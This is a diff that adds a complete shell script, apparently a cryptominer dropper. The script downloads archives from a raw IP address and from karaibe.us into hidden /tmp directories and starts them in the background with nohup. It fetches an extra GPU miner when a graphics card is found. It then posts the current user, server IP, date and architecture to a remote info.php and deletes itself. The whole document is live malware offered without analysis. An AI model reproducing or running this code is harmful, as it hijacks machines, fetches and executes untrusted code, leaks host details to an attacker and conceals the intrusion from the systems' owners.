@@ -1,0 +1,34 @@
+#!/bin/sh
+ARCH=`uname -m`
+cd /tmp
+wget http://67.205.129.169/.foo/ryo.tgz || curl -O http://www.karaibe.us/.foo/ryo.tgz || lwp-download http://67.205.129.169/.foo/ryo.tgz
+tar zxvf ryo.tgz
+rm -rf ryo.tgz
+cd .bin
+nohup ./start > /dev/null &
+lspci | grep VGA
+if [ $? -eq 0 ]; then
+        cd /tmp
+        mkdir .x
+        cd /tmp/.x
+        wget http://67.205.129.169/.foo/xmstak.tgz || curl -O http://karaibe.us/.foo/xmstak.tgz
+        tar zxvf xmstak.tgz
+        rm -rf xmstak.tgz
+        cd .xmstak
+        nohup ./start &
+fi
+cd /tmp
+rm -rf .vd
+mkdir .vd
+cd .vd
+wget http://67.205.129.169/.foo/sslm.tgz || curl -O http://www.karaibe.us/.foo/sslm.tgz || lwp-download http://67.205.129.169/.foo/sslm.tgz
+tar zxvf sslm.tgz
+rm -rf sslm.tgz
+cd .sslm
+nohup ./start > /dev/null &
+SERVERIP=`curl http://www.karaibe.us/.foo/remote/info.php`
+curl -d "info=NEWROOT&data=SERVER---> $(whoami)@$SERVERIP <br>DATE---> $(date) <br>ARCH---> $ARCH" http://www.karaibe.us/.foo/remote/info.php > /dev/null
+cd /tmp
+rm -rf $0
+rm -rf min.sh
+rm -rf /tmp/min.sh
